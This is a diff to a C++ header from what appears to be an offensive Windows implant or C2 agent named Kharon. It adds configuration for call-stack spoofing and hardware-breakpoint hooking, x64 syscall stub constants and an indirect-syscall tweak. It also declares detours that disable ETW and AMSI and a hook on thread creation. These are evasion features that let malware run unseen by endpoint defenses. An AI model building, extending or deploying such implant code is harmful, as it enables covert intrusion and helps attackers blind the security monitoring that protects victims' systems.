@@ -49,6 +49,14 @@ EXTERN_C UPTR EndPtr();
 #define KH_JITTER 0
 #endif // KH_JITTER
 
+#ifndef KH_CALL_STACK_SPOOF
+#define KH_CALL_STACK_SPOOF FALSE
+#endif // KH_CALL_STACK_SPOOF
+
+#ifndef KH_HARDWARE_BREAKPOINT_ENABLED
+#define KH_HARDWARE_BREAKPOINT_ENABLED FALSE
+#endif // KH_HARDWARE_BREAKPOINT_ENABLED
+
 #ifndef KH_INDIRECT_SYSCALL_ENABLED
 #define KH_INDIRECT_SYSCALL_ENABLED FALSE
 #endif // KH_INDIRECT_SYSCALL_ENABLED
@@ -133,6 +141,10 @@ class Transport;
 class Token;
 class Socket;
 
+#define x64_OPCODE_RET			0xC3
+#define x64_OPCODE_MOV			0xB8
+#define	x64_SYSCALL_STUB_SIZE   0x20
+
 typedef struct JOBS {
     PPACKAGE Pkg;
     PPARSER  Psr;
@@ -154,7 +166,7 @@ namespace Root {
 
     class Kharon {    
     public:
-        HwbpEng*   Hwbp;
+        HwbpEng*   Hw;
         Spoof*     Spf;
         Syscall*   Sys;
         Socket*    Sckt;
@@ -248,6 +260,8 @@ namespace Root {
             DECLAPI( GetProcAddress );
             DECLAPI( GetModuleHandleA );
 
+            DECLAPI( CreateTimerQueueTimer );
+
             DECLAPI( DuplicateHandle );
             DECLAPI( SetHandleInformation );
             DECLAPI( GetStdHandle );
@@ -325,6 +339,8 @@ namespace Root {
             RSL_TYPE( LoadLibraryA ),
             RSL_TYPE( GetProcAddress ),
             RSL_TYPE( GetModuleHandleA ),
+
+            RSL_TYPE( CreateTimerQueueTimer ),
 
             RSL_TYPE( DuplicateHandle ),
             RSL_TYPE( SetHandleInformation ),
@@ -616,7 +632,7 @@ namespace Root {
             _In_ UPTR Argument
         ) -> VOID;
 
-        VOID InitHwbp( HwbpEng* HwbpRf ) { Hwbp = HwbpRf; }
+        VOID InitHwbp( HwbpEng* HwbpRf ) { Hw = HwbpRf; }
         VOID InitSpoof( Spoof* SpoofRf ) { Spf = SpoofRf; }
         VOID InitSyscall( Syscall* SyscallRf ) { Sys = SyscallRf; }
         VOID InitSocket( Socket* SocketRf ) { Sckt = SocketRf; }
@@ -662,7 +678,7 @@ public:
         _In_ ESYS_OPT Idx,
         _In_ Args...  args
     ) -> NTSTATUS {
-        asm( "mov r14, %0" : : "r"( Ext[Idx].ssn ) );
+        asm( "mov r14d, %0" : : "r"( Ext[Idx].ssn ) );
         asm( "mov r15, %0" : : "r"( Ext[Idx].Instruction ) );
     
         return ExecSyscall( args... );
@@ -678,6 +694,7 @@ public:
     PDESCRIPTOR_HOOK Threads = nullptr;
     CRITICAL_SECTION CritSec = { 0 };
 
+    BOOL  Enabled     = KH_HARDWARE_BREAKPOINT_ENABLED;
     BOOL  Initialized = FALSE;
     PVOID Handler     = nullptr;
 
@@ -715,7 +732,7 @@ public:
         _In_ BOOL  Init
     ) -> BOOL;
 
-    auto RmBreak(
+    auto Uninstall(
         _In_ UPTR  Address,
         _In_ ULONG ThreadID
     ) -> BOOL;
@@ -742,17 +759,37 @@ public:
         _In_ ULONG ThreadID
     ) -> BOOL;
 
+    auto HookCallback(
+        _In_ PVOID Parameter,
+        _In_ BOOL  TimerWait
+    ) -> VOID;
+
     auto MainHandler( 
         _In_ PEXCEPTION_POINTERS e 
     ) -> LONG;
 
-    auto Etw(
-        _In_ PEXCEPTION_POINTERS e
-    ) -> LONG;
+    auto AddNewThreads(
+        _In_ INT8 Drx
+    ) -> BOOL;
 
-    auto Amsi(
-        _In_ PEXCEPTION_POINTERS e
-    ) -> LONG;
+    auto RmNewThreads(
+        _In_ INT8 Drx
+    ) -> BOOL;    
+
+    auto NtCreateThreadExHk(
+        _In_ PCONTEXT Ctx
+    ) -> VOID;
+
+    auto DotnetInit( VOID ) -> BOOL;
+    auto DotnetExit( VOID ) -> BOOL;
+
+    auto EtwDetour(
+        _In_ PCONTEXT Ctx
+    ) -> VOID;
+
+    auto AmsiDetour(
+        _In_ PCONTEXT Ctx
+    ) -> VOID;    
 };
 
 class Jobs {
